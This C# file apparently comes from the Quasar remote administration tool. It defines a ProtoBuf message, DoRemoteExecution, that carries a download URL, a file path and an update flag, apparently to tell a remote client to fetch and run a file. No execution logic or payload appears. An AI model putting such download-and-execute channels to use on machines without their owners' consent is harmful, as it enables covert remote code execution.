using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class DoRemoteExecution : IMessage
    {
        [ProtoMember(1)]
        public string DownloadUrl { get; set; }

        [ProtoMember(2)]
        public string FilePath { get; set; }

        [ProtoMember(3)]
        public bool IsUpdate { get; set; }
    }
}
